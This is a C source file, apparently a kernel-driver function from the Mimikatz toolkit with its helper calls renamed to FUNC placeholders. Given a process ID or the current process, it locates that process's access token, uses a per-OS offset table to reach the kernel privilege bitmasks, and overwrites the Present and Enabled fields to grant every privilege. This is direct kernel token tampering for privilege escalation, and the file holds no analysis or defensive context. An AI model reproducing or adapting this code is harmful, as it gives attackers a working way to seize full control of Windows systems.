#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  scalar_t__ ULONG_PTR ;
typedef  int /*<<< orphan*/  ULONG ;
struct TYPE_2__ {int* Present; int* Enabled; } ;
typedef  int SIZE_T ;
typedef  int /*<<< orphan*/  PVOID ;
typedef  scalar_t__* PULONG ;
typedef  TYPE_1__* PKIWI_NT6_PRIVILEGES ;
typedef  int /*<<< orphan*/  PKIWI_BUFFER ;
typedef  scalar_t__ PEPROCESS ;
typedef  int /*<<< orphan*/ * PACCESS_TOKEN ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  int /*<<< orphan*/  HANDLE ;

/* Variables and functions */
 scalar_t__** EPROCESS_OffSetTable ; 
 size_t KiwiOsIndex ; 
 size_t KiwiOsIndex_VISTA ; 
 scalar_t__ FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC3 () ; 
 int /*<<< orphan*/  FUNC4 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC5 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,scalar_t__*) ; 
 int /*<<< orphan*/ * FUNC7 (scalar_t__) ; 
 int /*<<< orphan*/  STATUS_NOT_SUPPORTED ; 
 int /*<<< orphan*/  STATUS_SUCCESS ; 
 size_t TokenPrivs ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 

NTSTATUS FUNC9(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pProcess = NULL;
	PACCESS_TOKEN pAccessToken = NULL;
	PKIWI_NT6_PRIVILEGES pPrivileges;
	PULONG pPid = (PULONG) bufferIn;

	if(KiwiOsIndex >= KiwiOsIndex_VISTA)
	{
		if(pPid && (szBufferIn == sizeof(ULONG)))
			status = FUNC6((HANDLE) *pPid, &pProcess);
		else
			pProcess = FUNC3();

		if(FUNC0(status) && pProcess)
		{
			if((pAccessToken = FUNC7(pProcess)))
			{
				status = FUNC8(outBuffer, L"All privileges for the access token from %u/%-14S\n", FUNC4(pProcess), FUNC5(pProcess));
				
				pPrivileges = (PKIWI_NT6_PRIVILEGES) (((ULONG_PTR) pAccessToken) + EPROCESS_OffSetTable[KiwiOsIndex][TokenPrivs]);
				pPrivileges->Present[0] = pPrivileges->Enabled[0] /*= pPrivileges->EnabledByDefault[0]*/ = 0xfc;
				pPrivileges->Present[1] = pPrivileges->Enabled[1] /*= pPrivileges->EnabledByDefault[1]*/ = //...0xff;
				pPrivileges->Present[2] = pPrivileges->Enabled[2] /*= pPrivileges->EnabledByDefault[2]*/ = //...0xff;
				pPrivileges->Present[3] = pPrivileges->Enabled[3] /*= pPrivileges->EnabledByDefault[3]*/ = 0xff;
				pPrivileges->Present[4] = pPrivileges->Enabled[4] /*= pPrivileges->EnabledByDefault[4]*/ = 0x0f;

				FUNC2(pAccessToken);
			}

			if(pProcess != FUNC3())
				FUNC1(pProcess);
		}
	}
	else status = STATUS_NOT_SUPPORTED;

	return status;
}